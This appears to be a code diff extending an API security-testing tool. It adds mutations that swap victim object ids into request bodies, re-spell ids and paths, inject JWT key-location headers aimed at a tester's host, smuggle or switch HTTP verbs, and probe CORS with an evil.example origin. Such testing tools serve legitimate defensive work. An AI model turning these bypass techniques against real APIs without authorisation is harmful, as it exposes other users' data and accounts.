@@ -296,6 +296,64 @@ def _content_type_switch(req: _Req, m: Mutation, env: _Env) -> None:
     req.note = f"re-encoded an identical body as {encoding} to bypass content-type-bound authorization"
 
 
+def _set_dotted(body: dict, dotted: str, value: object) -> None:
+    cursor = body
+    parts = str(dotted).split(".")
+    for part in parts[:-1]:
+        nxt = cursor.get(part)
+        if not isinstance(nxt, dict):
+            nxt = {}
+            cursor[part] = nxt
+        cursor = nxt
+    cursor[parts[-1]] = value
+
+
+def _swap_id_in_body(req: _Req, m: Mutation, env: _Env) -> None:
+    """Put the victim's id in a body field (`{"customerId": ...}`, `owner.id`).
+
+    Many APIs authorize on the path id but trust an id carried in the body, so
+    a write addressed to the attacker's own object can still be aimed at
+    someone else's through the payload.
+    """
+    field_name = m.detail.get("field", "id")
+    victim_id = victim_object_id(m.detail.get("id_field", field_name), env)
+    body = _as_dict_body(req)
+    _set_dotted(body, field_name, victim_id)
+    req.body = body
+    req.note = f"set body field '{field_name}' to another identity's object id {victim_id}"
+
+
+_ID_FORMAT_VARIANTS = ("zero", "negative", "me", "wildcard", "null", "uppercase", "padded", "url_encoded")
+
+
+def _mutate_id_format(req: _Req, m: Mutation, env: _Env) -> None:
+    """Re-spell the object id so a parser and its authorization check disagree.
+
+    `0`, `-1`, `me`, `*` and `null` probe special-case resolution ("the current
+    user", "all"); case, zero-padding and percent-encoding of the victim's own
+    id probe a check that compares the raw string while the data layer
+    normalises it.
+    """
+    variant = str(m.detail.get("variant", "zero"))
+    if variant not in _ID_FORMAT_VARIANTS:
+        raise MutationError(
+            f"mutate_id_format: unknown variant {variant!r}; use one of {list(_ID_FORMAT_VARIANTS)}"
+        )
+    id_key = m.detail.get("id_field", "victim_id")
+    fixed = {"zero": "0", "negative": "-1", "me": "me", "wildcard": "*", "null": "null"}
+    if variant in fixed:
+        value = fixed[variant]
+    else:
+        victim_id = victim_object_id(id_key, env)
+        value = {
+            "uppercase": victim_id.upper() if victim_id.upper() != victim_id else victim_id + "A",
+            "padded": "00" + victim_id,
+            "url_encoded": "".join(f"%{ord(c):02x}" for c in victim_id),
+        }[variant]
+    env.context[id_key] = value
+    req.note = f"re-spelled the object id as {value!r} ({variant}) to test id normalisation"
+
+
 # --- API2: authentication ----------------------------------------------------
 
 
@@ -349,6 +407,26 @@ def _jwt_claim_tamper(req: _Req, m: Mutation, env: _Env) -> None:
 
     _mutate_bearer(req, transform)
     req.note = f"rewrote JWT claims {sorted(claims)} while keeping the original signature"
+
+
+def _jwt_header_injection(req: _Req, m: Mutation, env: _Env) -> None:
+    """Add header parameters that tell a verifier where to find its key
+    (`jku`, `x5u`, `jwk`), keeping the original signature. A verifier that
+    fetches or trusts them is steerable; one that verifies the signature
+    against a pinned key rejects the token regardless."""
+    headers = m.detail.get("headers") or {"jku": m.detail.get("jku_url", "")}
+    headers = {k: v for k, v in headers.items() if v}
+    if not headers:
+        raise MutationError(
+            "jwt_header_injection needs detail['headers'] or detail['jku_url'] "
+            "(point it at a collaborator/OAST host you control)."
+        )
+
+    def transform(header, payload, sig):
+        return jwt_tools.assemble({**header, **headers}, payload, sig)
+
+    _mutate_bearer(req, transform)
+    req.note = f"added JWT header parameter(s) {sorted(headers)} while keeping the original signature"
 
 
 def _jwt_expired_replay(req: _Req, m: Mutation, env: _Env) -> None:
@@ -518,12 +596,75 @@ def _method_override(req: _Req, m: Mutation, env: _Env) -> None:
     """Smuggle a privileged verb through a permitted one. Gateways and WAFs
     authorize the outer method; the framework often honours the override header."""
     target_method = str(m.detail.get("method", "DELETE")).upper()
-    header_name = m.detail.get("header", "X-HTTP-Method-Override")
-    req.headers[header_name] = target_method
+    via = str(m.detail.get("via", "header"))
+    name = m.detail.get("header" if via == "header" else "field",
+                        "X-HTTP-Method-Override" if via == "header" else "_method")
+    if via == "header":
+        req.headers[name] = target_method
+    elif via == "query":
+        req.query[name] = target_method
+    elif via == "body":
+        body = _as_dict_body(req)
+        body[name] = target_method
+        req.body = body
+    else:
+        raise MutationError(f"method_override: 'via' must be header, query or body, got {via!r}")
     req.note = (
         f"kept the outer {req.method} but requested {target_method} via "
-        f"'{header_name}' (verb smuggling past method-based authorization)"
+        f"{via} '{name}' (verb smuggling past method-based authorization)"
     )
+
+
+_SWITCHABLE_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"}
+
+
+def _method_switch(req: _Req, m: Mutation, env: _Env) -> None:
+    """Send the request with a different HTTP verb.
+
+    Routers that register a handler per verb sometimes attach the authorization
+    decorator to only some of them, so the same path is protected for GET and
+    open for PUT — or answers TRACE/OPTIONS with more than it should.
+    """
+    method = str(m.detail.get("method", "PUT")).upper()
+    if method not in _SWITCHABLE_METHODS:
+        raise MutationError(f"method_switch: unsupported method {method!r}")
+    req.note = f"re-sent {req.path} as {method} instead of {req.method}"
+    req.method = method
+
+
+_PATH_VARIANTS = ("uppercase", "double_slash", "dot_segment", "trailing_slash", "semicolon")
+
+
+def _path_normalization_bypass(req: _Req, m: Mutation, env: _Env) -> None:
+    """Spell the same route so a gateway's path rule and the framework's router
+    disagree (upper-case, a doubled slash, a trailing `/.`  or `/`, or a matrix
+    parameter). Only literal segments are touched: `{id}` templates survive."""
+    variant = str(m.detail.get("variant", "uppercase"))
+    if variant not in _PATH_VARIANTS:
+        raise MutationError(
+            f"path_normalization_bypass: unknown variant {variant!r}; use one of {list(_PATH_VARIANTS)}"
+        )
+    path = str(m.detail.get("path") or req.path)
+    if path.startswith(("http://", "https://")):
+        raise MutationError("path_normalization_bypass: path must be relative; absolute URLs bypass scope.")
+    segments = path.split("/")
+    literal = [i for i, s in enumerate(segments) if s and not (s.startswith("{") and s.endswith("}"))]
+    if not literal:
+        raise MutationError("path_normalization_bypass: the path has no literal segment to rewrite.")
+    first = literal[0]
+    if variant == "uppercase":
+        new_path = "/".join(s.upper() if i in literal else s for i, s in enumerate(segments))
+    elif variant == "double_slash":
+        new_path = "/" + path if path.startswith("/") else "//" + path
+    elif variant == "dot_segment":
+        new_path = path.rstrip("/") + "/."
+    elif variant == "trailing_slash":
+        new_path = path.rstrip("/") + "/"
+    else:  # semicolon
+        segments[first] = segments[first] + ";x=1"
+        new_path = "/".join(segments)
+    req.note = f"re-spelled {req.path} as {new_path} ({variant}) to test path-based access rules"
+    req.path = new_path
 
 
 def _admin_path_swap(req: _Req, m: Mutation, env: _Env) -> None:
@@ -600,8 +741,10 @@ def _ssrf_url_bypass(req: _Req, m: Mutation, env: _Env) -> None:
 
 
 def _cors_probe(req: _Req, m: Mutation, env: _Env) -> None:
+    # "null" is what a sandboxed iframe or a file:// page sends — an allowlist
+    # written as "reflect whatever isn't obviously absent" often waves it through.
     origin = m.detail.get("origin", "https://evil.example")
-    req.headers["Origin"] = origin
+    req.headers["Origin"] = str(origin)
     req.note = f"sent Origin: {origin} to see whether the CORS policy reflects arbitrary origins"
 
 
@@ -777,6 +920,8 @@ for _spec, _handler in [
     (MutationSpec("swap_id_in_header", _A.API1, "Scope the request to the victim via a client-supplied header", needs_target_persona=True), _swap_id_in_header),
     (MutationSpec("id_param_pollution", _A.API1, "Duplicate the id parameter with own + victim values", needs_target_persona=True), _id_param_pollution),
     (MutationSpec("wrap_id_array", _A.API1, "Wrap the id in an array to slip past scalar authorization checks", needs_target_persona=True), _wrap_id_array),
+    (MutationSpec("swap_id_in_body", _A.API1, "Put the victim's object id in a request-body field", needs_target_persona=True), _swap_id_in_body),
+    (MutationSpec("mutate_id_format", _A.API1, "Re-spell the object id (0, -1, me, *, case, padding, encoding) to confuse id handling", needs_target_persona=True), _mutate_id_format),
     (MutationSpec("content_type_switch", _A.API1, "Re-encode the body to bypass content-type-bound authorization"), _content_type_switch),
     # API2
     (MutationSpec("drop_auth", _A.API2, "Remove the credential entirely"), _drop_auth),
@@ -785,6 +930,7 @@ for _spec, _handler in [
     (MutationSpec("jwt_alg_confusion", _A.API2, "Downgrade the JWT to HS256 signed with a weak key"), _jwt_alg_confusion),
     (MutationSpec("jwt_claim_tamper", _A.API2, "Rewrite JWT claims keeping the original signature"), _jwt_claim_tamper),
     (MutationSpec("jwt_expired_replay", _A.API2, "Replay the JWT with a long-past expiry"), _jwt_expired_replay),
+    (MutationSpec("jwt_header_injection", _A.API2, "Add jku/x5u/jwk header parameters to the JWT keeping its signature"), _jwt_header_injection),
     (MutationSpec("jwt_kid_injection", _A.API2, "Inject a traversal payload into the JWT kid header"), _jwt_kid_injection),
     (MutationSpec("borrowed_token", _A.API2, "Present another persona's valid credential"), _borrowed_token),
     # API3
@@ -799,6 +945,8 @@ for _spec, _handler in [
     # API5
     (MutationSpec("escalate_persona", _A.API5, "Invoke a privileged function as a low-privileged identity"), _escalate_persona),
     (MutationSpec("method_override", _A.API5, "Smuggle a privileged verb via an override header"), _method_override),
+    (MutationSpec("method_switch", _A.API5, "Re-send the request with a different HTTP verb"), _method_switch),
+    (MutationSpec("path_normalization_bypass", _A.API5, "Re-spell the route (case, //, /., trailing slash, matrix param) to slip past path-based access rules"), _path_normalization_bypass),
     (MutationSpec("admin_path_swap", _A.API5, "Re-aim the request at the administrative route"), _admin_path_swap),
     # API6
     (MutationSpec("repeat_flow", _A.API6, "Automate a sensitive business flow", multi_request=True), _repeat_flow),
